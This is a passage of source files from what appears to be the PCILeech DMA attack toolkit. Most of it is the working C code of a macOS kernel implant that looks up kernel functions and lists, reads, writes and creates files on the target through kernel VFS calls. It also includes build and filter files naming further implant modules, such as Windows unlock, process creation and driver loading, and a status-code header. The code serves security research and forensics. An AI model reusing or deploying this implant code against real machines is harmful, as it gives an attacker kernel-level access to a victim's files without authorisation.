	QWORD	tv_nsec;	// nanoseconds
};

enum vtype {
	VNON,
	VREG, VDIR, VBLK, VCHR, VLNK,
	VSOCK, VFIFO, VBAD, VSTR, VCPLX
};

#define ATTR_BIT_MAP_COUNT			5
#define ATTR_CMN_NAME				0x00000001
#define ATTR_CMN_OBJTYPE			0x00000008
#define ATTR_CMN_CRTIME				0x00000200
#define ATTR_CMN_MODTIME			0x00000400
#define ATTR_CMN_ACCTIME			0x00001000
#define ATTR_CMN_RETURNED_ATTRS 	0x80000000	
#define ATTR_DIR_ENTRYCOUNT			0x00000002
#define ATTR_FILE_TOTALSIZE			0x00000002

struct vnode_attr {
	/* bitfields */
	QWORD	va_supported;
	QWORD	va_active;
	QWORD	unknown[64];
};

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_put;
	QWORD vnode_setsize;
	QWORD vnode_open;
	QWORD vnode_close;
	QWORD VNOP_READ;
	QWORD VNOP_WRITE;
	QWORD VNOP_GETATTRLISTBULK;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 's', 'e', 't', 's', 'i', 'z', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'W', 'R', 'I', 'T', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'G', 'E', 'T', 'A', 'T', 'T', 'R', 'L', 'I', 'S', 'T', 'B', 'U', 'L', 'K', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

QWORD UnixToWindowsFiletime(QWORD tv) {
	QWORD result = 11644473600ULL; // EPOCH DIFF
	result += tv;
	result *= 10000000ULL;
	return result;
}

STATUS VfsList(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	DWORD status = STATUS_SUCCESS;
	QWORD i, uio = 0, vnode = 0, vfs_current;
	PFNMACOS pfn1 = &pk->fn;
	PVFS_RESULT_FILEINFO pfi;
	QWORD qw, p, cfi = 0, pbRecordFull, cbRecordFull, pbRecord;
	attribute_set_t *pAttrSet;
	attrreference_t *pAttrRef;
	DWORD dw, eofflag, actualcount;
	struct timespec *pts;
	struct vnode_attr va;
	struct attrlist al;
	if(pk->dataOutExtraLengthMax < 0x00100000) {
		status = STATUS_FAIL_OUTOFMEMORY;
		goto fail;
	}
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_lookup, pop->szFileName, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	SysVCall(pfn1->memset, &va, 0, sizeof(struct vnode_attr));
	// set attribute list with attributes that should be retrieved.
	SysVCall(pfn1->memset, &al, 0, sizeof(struct attrlist));
	al.bitmapcount = ATTR_BIT_MAP_COUNT;
	al.commonattr = ATTR_CMN_NAME | ATTR_CMN_RETURNED_ATTRS | ATTR_CMN_CRTIME | ATTR_CMN_MODTIME | ATTR_CMN_ACCTIME | ATTR_CMN_OBJTYPE;
	al.fileattr = ATTR_FILE_TOTALSIZE;
	al.dirattr = ATTR_DIR_ENTRYCOUNT;
	while(TRUE) {
		actualcount = 0;
		pbRecordFull = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLengthMax - 0x00010000;
		SysVCall(pfn1->memset, pbRecordFull, 0, 0x00010000);
		uio = SysVCall(pfn2->uio_create, 1 /* count iov */, cfi /* offset */, 2 /* kernel addr */, 0 /* read */);
		if(SysVCall(pfn2->uio_addiov, uio, pbRecordFull, 0x00010000)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto fail;
		}
		if(SysVCall(pfn2->VNOP_GETATTRLISTBULK, vnode, &al, &va, uio, NULL /* private */, 0 /* options */, &eofflag, &actualcount, vfs_current)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto fail;
		}
		if(0 == actualcount) {
			break;
		}
		if((pk->dataOutExtraLengthMax - 0x00010000) < (cfi + actualcount) * sizeof(VFS_RESULT_FILEINFO)) {
			break;
		}
		for(p = 0; p < actualcount; p++) {
			pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + (p + cfi) * sizeof(VFS_RESULT_FILEINFO));
			SysVCall(pfn1->memset, pfi, 0, sizeof(VFS_RESULT_FILEINFO));
			cbRecordFull = *(PDWORD)pbRecordFull;
			pbRecord = pbRecordFull;
			pbRecordFull += cbRecordFull;
			pbRecord += sizeof(DWORD);
			pAttrSet = (attribute_set_t*)pbRecord;
			pbRecord += sizeof(attribute_set_t);
			if(pAttrSet->commonattr & ATTR_CMN_NAME) {
				pAttrRef = (attrreference_t*)pbRecord;
				pbRecord += sizeof(attrreference_t);
				qw = pAttrRef->attr_length;
				if(qw > MAX_PATH - 1) {
					qw = MAX_PATH - 1;
				}
				for(i = 0; i < qw; i++) {
					pfi->wszFileName[i] = *(PCHAR)((QWORD)pAttrRef + pAttrRef->attr_dataoffset + i);
				}
			}
			if(pAttrSet->commonattr & ATTR_CMN_OBJTYPE) {
				// vnode type
				dw = *(PDWORD)pbRecord;
				pbRecord += sizeof(DWORD);
				if(dw == VREG) {
					pfi->flags |= VFS_FLAGS_FILE_NORMAL;
				} else if(dw == VDIR) {
					pfi->flags |= VFS_FLAGS_FILE_DIRECTORY;
				} else if(dw == VLNK) {
					pfi->flags |= VFS_FLAGS_FILE_SYMLINK;
				} else {
					pfi->flags |= VFS_FLAGS_FILE_OTHER;
				}
			}
			if(pAttrSet->commonattr & ATTR_CMN_CRTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tCreateOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->commonattr & ATTR_CMN_MODTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tModifyOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->commonattr & ATTR_CMN_ACCTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tAccessOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->fileattr & ATTR_FILE_TOTALSIZE) {
				pfi->cb = *(PQWORD)pbRecord;
				pbRecord += sizeof(QWORD);
			}
		}
		SysVCall(pfn2->uio_free, uio);
		uio = 0;
		cfi += actualcount;
	}
	pk->dataOutExtraLength = cfi * sizeof(VFS_RESULT_FILEINFO);
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_put, vnode); }
	return cfi ? STATUS_SUCCESS : status;
}

STATUS VfsDelete(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	UNREFERENCED_PARAMETER(pfn2);
	UNREFERENCED_PARAMETER(pop);
	return STATUS_FAIL_NOT_IMPLEMENTED;
}

STATUS VfsRead(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD uio = 0, vnode = 0, vfs_current;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_lookup, pop->szFileName, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	uio = SysVCall(pfn2->uio_create, 1 /* count iov */, pop->offset /* offset */, 2 /* kernel addr */, 0 /* read */);
	if(SysVCall(pfn2->uio_addiov, uio, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(SysVCall(pfn2->VNOP_READ, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	pk->dataOutExtraLength = pk->dataOutExtraLengthMax - SysVCall(pfn2->uio_resid, uio);
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_put, vnode); }
	return status;
}

STATUS VfsWrite(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD uio = 0, vnode = 0, flags = 0, vfs_current;
	flags |= O_WRONLY;
	flags |= (pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) ? O_TRUNC : 0;
	flags |= (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? O_APPEND : 0;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_open, pop->szFileName, flags, 0, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	uio = SysVCall(pfn2->uio_create, 1 /* count iov */, pop->offset /* offset */, 2 /* kernel addr */, 1 /* write */);
	if(SysVCall(pfn2->uio_addiov, uio, pop->pb, pop->cb)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(SysVCall(pfn2->VNOP_WRITE, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(flags & O_TRUNC) {
		SysVCall(pfn2->vnode_setsize, vnode, pop->offset + pop->cb, 0, vfs_current);
	}
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current); }
	return status;
}

STATUS VfsCreate(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD vnode = 0, vfs_current;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_open, pop->szFileName, O_CREAT | O_WRONLY | O_TRUNC, 0x1ff /*-rwxrwxrwx*/, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
fail:
	if(vnode) { SysVCall(pfn2->vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current); }
	return status;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	PVFS_OPERATION pop;
	FN2 fn2;
	// initialize kernel functions
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC) || (pop->flags & VFS_FLAGS_UNICODE)) {
		pk->dataOut[0] = STATUS_FAIL_SIGNATURE_NOT_FOUND;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, &fn2, pop);
		return;
	}
}

```

`pcileech_shellcode/pcileech_shellcode.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{5C698F13-6E9F-46F3-95FC-55376A65D8BF}</ProjectGuid>
    <RootNamespace>pcileech_shellcode</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)\files\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>No</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="fbsdx64_common.c" />
    <ClCompile Include="fbsdx64_filepull.c" />
    <ClCompile Include="fbsdx64_stage3_c.c" />
    <ClCompile Include="lx64_common.c" />
    <ClCompile Include="lx64_filedelete.c" />
    <ClCompile Include="lx64_filepull.c" />
    <ClCompile Include="lx64_filepush.c" />
    <ClCompile Include="lx64_stage3_c.c" />
    <ClCompile Include="lx64_vfs.c" />
    <ClCompile Include="macos_common.c" />
    <ClCompile Include="macos_filepull.c" />
    <ClCompile Include="macos_filepush.c" />
    <ClCompile Include="macos_stage3_c.c" />
    <ClCompile Include="macos_unlock.c" />
    <ClCompile Include="macos_vfs.c" />
    <ClCompile Include="uefi_common.c" />
    <ClCompile Include="uefi_kmd_c.c" />
    <ClCompile Include="uefi_textout.c" />
    <ClCompile Include="uefi_winload_ntos_kmd_c.c" />
    <ClCompile Include="uefi_winload_ntos_patch.c" />
    <ClCompile Include="wx64_common.c" />
    <ClCompile Include="wx64_driverinfo.c" />
    <ClCompile Include="wx64_driverload_svc.c" />
    <ClCompile Include="wx64_driverunload.c" />
    <ClCompile Include="wx64_exec_user_c.c" />
    <ClCompile Include="wx64_filepull.c" />
    <ClCompile Include="wx64_filepush.c" />
    <ClCompile Include="wx64_pagesignature.c" />
    <ClCompile Include="wx64_pscreate.c" />
    <ClCompile Include="wx64_pskill.c" />
    <ClCompile Include="wx64_pslist.c" />
    <ClCompile Include="wx64_stage3_c.c" />
    <ClCompile Include="wx64_umd_exec_c.c" />
    <ClCompile Include="wx64_unlock.c" />
    <ClCompile Include="wx64_vfs.c" />
  </ItemGroup>
  <ItemGroup>
    <None Include="fbsdx64_common_a.asm" />
    <None Include="fbsdx64_stage2.asm" />
    <None Include="fbsdx64_stage3.asm" />
    <None Include="lx64_common_a.asm" />
    <None Include="lx64_stage2.asm" />
    <None Include="lx64_stage2_efi.asm" />
    <None Include="lx64_stage3.asm" />
    <None Include="lx64_stage3_pre.asm" />
    <None Include="macos_common_a.asm" />
    <None Include="macos_stage2.asm" />
    <None Include="macos_stage3.asm" />
    <None Include="uefi_common_a.asm" />
    <None Include="uefi_kmd.asm" />
    <None Include="uefi_winload_ntos_kmd.asm" />
    <None Include="wx64_common_a.asm" />
    <None Include="wx64_exec_user.asm" />
    <None Include="wx64_pageinfo.asm" />
    <None Include="wx64_psblue.asm" />
    <None Include="wx64_stage1.asm" />
    <None Include="wx64_stage2.asm" />
    <None Include="wx64_stage23_vmm.asm" />
    <None Include="wx64_stage23_vmm3.asm" />
    <None Include="wx64_stage2_hal.asm" />
    <None Include="wx64_stage3.asm" />
    <None Include="wx64_stage3_pre.asm" />
    <None Include="wx64_umd_exec.asm" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="fbsdx64_common.h" />
    <ClInclude Include="lx64_common.h" />
    <ClInclude Include="macos_common.h" />
    <ClInclude Include="statuscodes.h" />
    <ClInclude Include="uefi_common.h" />
    <ClInclude Include="wx64_common.h" />
  </ItemGroup>
  <ItemGroup>
    <Text Include="info_kmd_core.txt" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`pcileech_shellcode/pcileech_shellcode.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Source Files\unlock">
      <UniqueIdentifier>{e34718ee-5344-4296-a04e-8c9e8198aaaa}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\page">
      <UniqueIdentifier>{c5c3b27a-a45b-4c05-8f38-e7d76a832d65}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\kmd_core">
      <UniqueIdentifier>{62ec3c7b-fa66-4ed4-84ef-2f9469ebe84c}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\file">
      <UniqueIdentifier>{c98e896d-5c0c-40f2-a538-e208e64a07ff}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\exec">
      <UniqueIdentifier>{6247613d-5996-48a0-86bf-0670af977875}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\driver">
      <UniqueIdentifier>{6f2a8f51-7e58-4913-9be5-0efa279dbe3a}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\vfs">
      <UniqueIdentifier>{fbf1519d-9768-4c2e-9bf2-c4a5f13a5f62}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\test">
      <UniqueIdentifier>{5098b4fc-a903-4dfa-b480-ea87dfca3baf}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\umd_exec">
      <UniqueIdentifier>{c376b98a-8b0b-4c3a-b687-59543d20cf03}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="lx64_common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wx64_common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wx64_unlock.c">
      <Filter>Source Files\unlock</Filter>
    </ClCompile>
    <ClCompile Include="wx64_pagesignature.c">
      <Filter>Source Files\page</Filter>
    </ClCompile>
    <ClCompile Include="lx64_stage3_c.c">
      <Filter>Source Files\kmd_core</Filter>
    </ClCompile>
    <ClCompile Include="lx64_filedelete.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="lx64_filepull.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="lx64_filepush.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="wx64_filepull.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="wx64_filepush.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="wx64_exec_user_c.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="wx64_pscreate.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="wx64_pskill.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="wx64_pslist.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="wx64_driverinfo.c">
      <Filter>Source Files\driver</Filter>
    </ClCompile>
    <ClCompile Include="wx64_driverunload.c">
      <Filter>Source Files\driver</Filter>
    </ClCompile>
    <ClCompile Include="wx64_driverload_svc.c">
      <Filter>Source Files\driver</Filter>
    </ClCompile>
    <ClCompile Include="macos_common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="macos_unlock.c">
      <Filter>Source Files\unlock</Filter>
    </ClCompile>
    <ClCompile Include="macos_filepull.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="macos_filepush.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="macos_stage3_c.c">
      <Filter>Source Files\kmd_core</Filter>
    </ClCompile>
    <ClCompile Include="fbsdx64_stage3_c.c">
      <Filter>Source Files\kmd_core</Filter>
    </ClCompile>
    <ClCompile Include="fbsdx64_filepull.c">
      <Filter>Source Files\file</Filter>
    </ClCompile>
    <ClCompile Include="fbsdx64_common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wx64_stage3_c.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="lx64_vfs.c">
      <Filter>Source Files\vfs</Filter>
    </ClCompile>
    <ClCompile Include="macos_vfs.c">
      <Filter>Source Files\vfs</Filter>
    </ClCompile>
    <ClCompile Include="wx64_vfs.c">
      <Filter>Source Files\vfs</Filter>
    </ClCompile>
    <ClCompile Include="uefi_common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="uefi_kmd_c.c">
      <Filter>Source Files\kmd_core</Filter>
    </ClCompile>
    <ClCompile Include="uefi_textout.c">
      <Filter>Source Files\test</Filter>
    </ClCompile>
    <ClCompile Include="uefi_winload_ntos_kmd_c.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="uefi_winload_ntos_patch.c">
      <Filter>Source Files\exec</Filter>
    </ClCompile>
    <ClCompile Include="wx64_umd_exec_c.c">
      <Filter>Source Files\umd_exec</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="lx64_common_a.asm">
      <Filter>Source Files</Filter>
    </None>
    <None Include="wx64_common_a.asm">
      <Filter>Source Files</Filter>
    </None>
    <None Include="wx64_pageinfo.asm">
      <Filter>Source Files\page</Filter>
    </None>
    <None Include="lx64_stage2.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="lx64_stage3.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="lx64_stage3_pre.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_stage1.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_stage2.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_stage3.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_stage3_pre.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_exec_user.asm">
      <Filter>Source Files\exec</Filter>
    </None>
    <None Include="wx64_psblue.asm">
      <Filter>Source Files\exec</Filter>
    </None>
    <None Include="wx64_stage2_hal.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="macos_common_a.asm">
      <Filter>Source Files</Filter>
    </None>
    <None Include="macos_stage2.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="macos_stage3.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="fbsdx64_stage2.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="fbsdx64_stage3.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="fbsdx64_common_a.asm">
      <Filter>Source Files</Filter>
    </None>
    <None Include="lx64_stage2_efi.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="uefi_common_a.asm">
      <Filter>Source Files</Filter>
    </None>
    <None Include="uefi_kmd.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="uefi_winload_ntos_kmd.asm">
      <Filter>Source Files\exec</Filter>
    </None>
    <None Include="wx64_umd_exec.asm">
      <Filter>Source Files\umd_exec</Filter>
    </None>
    <None Include="wx64_stage23_vmm.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
    <None Include="wx64_stage23_vmm3.asm">
      <Filter>Source Files\kmd_core</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="lx64_common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="wx64_common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="macos_common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="statuscodes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="fbsdx64_common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="uefi_common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Text Include="info_kmd_core.txt">
      <Filter>Source Files\kmd_core</Filter>
    </Text>
  </ItemGroup>
</Project>
```

`pcileech_shellcode/pcileech_shellcode.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`pcileech_shellcode/statuscodes.h`:

```h
// statuscodes_common.h : status codes for non-windows kernel implants.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __STATUSCODES_H__
#define __STATUSCODES_H__

#define STATUS_SUCCESS						0x00000000
#define STATUS_FAIL_BASE					0xf0000000
#define STATUS_FAIL_FUNCTION_LOOKUP			0xf0000001
#define STATUS_FAIL_FILE_CANNOT_OPEN		0xf0000002
#define STATUS_FAIL_FILE_SIZE				0xf0000003
#define STATUS_FAIL_INPPARAMS_BAD			0xf0000004
#define STATUS_FAIL_ACTION					0xf0000005
#define STATUS_FAIL_SIGNATURE_NOT_FOUND		0xf0000006
#define STATUS_FAIL_OUTOFMEMORY				0xf0000007
#define STATUS_FAIL_MEMORYMAP_NOT_FOUND		0xf0000008
#define STATUS_FAIL_FILE_READWRITE			0xf0000009
#define STATUS_FAIL_PCILEECH_CORE			0xf000000a
#define STATUS_FAIL_NOT_IMPLEMENTED			0xf000000b

#define KMD_CMD_VOID						0xffff
#define KMD_CMD_COMPLETED					0
#define KMD_CMD_READ						1
#define KMD_CMD_WRITE						2
#define KMD_CMD_TERMINATE					3
#define KMD_CMD_MEM_INFO					4
#define KMD_CMD_EXEC						5
